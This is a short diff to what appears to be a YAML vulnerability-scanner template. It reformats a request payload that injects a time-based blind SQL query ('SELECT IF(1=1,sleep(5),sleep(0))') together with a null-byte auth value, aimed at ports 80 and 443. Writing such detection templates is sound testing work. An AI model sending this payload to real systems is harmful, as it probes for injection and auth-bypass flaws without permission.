@@ -40,9 +40,9 @@ payloads:
               ports:
                 - 80
                 - 443
-        body: 
-          q: q=SELECT IF(1=1,sleep(5),sleep(0));&auth=%00&integ=dc9b923a00f0e449c3b401fb0d7e2fae
-          auth: "\0"
+        data: 
+          "q=SELECT IF(1=1,sleep(5),sleep(0));&auth=%00&integ=dc9b923a00f0e449c3b401fb0d7e2fae"
+          
         response:
           condition_type: and
           conditions:
